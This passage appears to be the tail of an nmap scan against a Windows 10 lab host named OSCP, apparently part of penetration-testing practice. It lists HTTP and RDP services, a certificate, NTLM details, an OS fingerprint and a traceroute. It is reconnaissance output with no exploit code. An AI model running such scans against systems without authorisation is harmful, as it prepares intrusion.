|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Home
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=OSCP
| Issuer: commonName=OSCP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-17T18:21:24
| Not valid after:  2026-06-18T18:21:24
| MD5:   ccdf:5317:9dcc:365d:5918:9753:da6c:8426
| SHA-1: 954b:9f27:07a3:eda1:5a1e:d344:1827:d952:12de:929d
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQFZ4Y95YLh4JAb0HFEnQ0hjANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRPU0NQMB4XDTI1MTIxNzE4MjEyNFoXDTI2MDYxODE4MjEyNFow
| DzENMAsGA1UEAxMET1NDUDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AM16OrSy8Y3L7E8crObym5lut8AIOwhjs3ujMAEpTDxNPC0DITN5xYunphf/H2QU
| IbM+k8S4u1ewOdTAe6o0tnvEpQ7PfKUk9Ybc+w4MXeMqvCjAXC/MQyq8byRgAPQS
| k7a0adk/e/ekKSWKkubmaHj50GT75x3ROgAOVy8YYINyfU2c+g/TDjMS/wZmRzv+
| x0ybxlAXk28vgeCL85KvMo745wWBSDUsXCY+AkkcHJV4cZd/yHfbrNnlHk/R5QQA
| E7AS/7UyVivfe+/bNQktT6wfuksZq6vHpqI/PX0VtiIi6UL35GOybengQLAPLFI8
| hGHJxh9OMwIsD+modd9Z7RECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBlQalIjlQY7xFhNFeY97+7
| yeNuej+bLvYZEoO1Njv+l0XcrdnbGYP/kOu4wZVst3y4vASPKyHELdA6IJ93+/iV
| BQmFg/PQkExD/+OUBBXeBkcP5WDLp1QHB8jVs5naXTMtSLOVJLNrt8Fn2M1X8MKw
| u7wx993h2EGHAJZNVXh0xuCajSBwVhVtimmAHrEK/a7iceKYGSsaiNnkqkHH4dMe
| YRwd2Px08FzuxyjGZ3w/KiBe0FO0vXuiLoitGkrPq3vrDsHA2KNe7u6FXs18theN
| gSX9cckU3XG8DA4hvwwCmHJbu2Y6wlmpmqQZCWwobxGDlMxGrOfVr+43+oZ5rZd1
|_-----END CERTIFICATE-----
|_ssl-date: 2025-12-19T00:08:25+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: OSCP
|   DNS_Computer_Name: OSCP
|   Product_Version: 10.0.19041
|_  System_Time: 2025-12-19T00:07:55+00:00
8080/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-generator: Nicepage 4.12.21, nicepage.com
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Microsoft Windows 10 1909 - 2004 (91%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=12/18%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6944977B%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
SEQ(SP=FD%GCD=1%ISR=10A%TI=I%II=I%SS=S%TS=U)
OPS(O1=M551NW8NNS%O2=M551NW8NNS%O3=M551NW8%O4=M551NW8NNS%O5=M551NW8NNS%O6=M551NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M551NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   162.25 ms 192.168.49.1
2   162.32 ms 192.168.55.112

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:08
Completed NSE at 21:08, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 346.24 seconds
           Raw packets sent: 196888 (8.667MB) | Rcvd: 292 (40.468KB)
```